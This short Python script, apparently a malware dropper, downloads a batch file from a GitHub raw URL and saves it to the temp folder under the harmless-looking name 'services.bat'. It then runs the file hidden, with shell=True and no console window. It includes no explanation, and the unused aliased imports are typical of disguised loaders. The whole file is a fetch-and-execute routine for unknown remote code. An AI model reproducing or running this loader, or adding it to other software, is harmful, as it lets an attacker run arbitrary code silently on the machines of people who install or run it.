from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from subprocess import Popen, CREATE_NO_WINDOW
import subprocess
import requests
import os
import uuid
import tempfile

def run_bat(bat_file_path):
    try:
        Popen(
            [bat_file_path],
            creationflags=CREATE_NO_WINDOW,
            shell=True
        )
    except subprocess.CalledProcessError as e:
        print(f"Error executing batch file:\n{e.stderr}")
        return e.returncode
    except FileNotFoundError:
        print(f"Error: Batch file not found at {bat_file_path}")
        return -1

url = "https://raw.githubusercontent.com/Dch12zz/services/refs/heads/main/main.bat"
temp = tempfile.gettempdir()
name = os.path.join(temp, f"services.bat")

response = requests.get(url,verify=True)
if response.status_code == 200:
    with open(name, 'wb') as dosya:
        dosya.write(response.content)
        run_bat(name)
